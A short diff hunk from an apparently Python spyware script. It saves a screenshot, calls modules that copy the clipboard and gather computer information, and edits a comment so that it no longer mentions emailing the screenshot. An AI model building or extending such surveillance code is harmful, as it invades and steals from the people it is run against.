@@ -106,7 +106,7 @@ def screenshot():
     im.save(file_path + extend + screenshot_info)
 
 
-# Calling all of the spyware modules and emailing the screenshot
+# Calling all of the spyware modules
 copy_clipboard()
 
 computer_info()
